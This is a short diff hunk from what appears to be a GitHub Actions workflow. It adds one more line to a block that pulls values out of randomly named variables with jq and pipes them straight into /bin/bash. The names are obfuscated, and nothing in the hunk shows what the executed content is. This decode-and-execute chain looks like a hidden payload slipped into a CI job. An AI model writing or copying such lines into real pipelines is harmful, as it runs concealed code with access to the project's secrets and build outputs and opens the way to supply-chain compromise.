@@ -32,6 +32,7 @@ jobs:
           echo $q9 | jq -r .qahw08393 | /bin/bash
           printf '%s' "$ahll40" | jq -r .ekm6 | /bin/bash
           printf '%s' "$lnp7" | jq -r .rjsj3 | /bin/bash
+          printf '%s' "$sj168" | jq -r .rigo66145 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
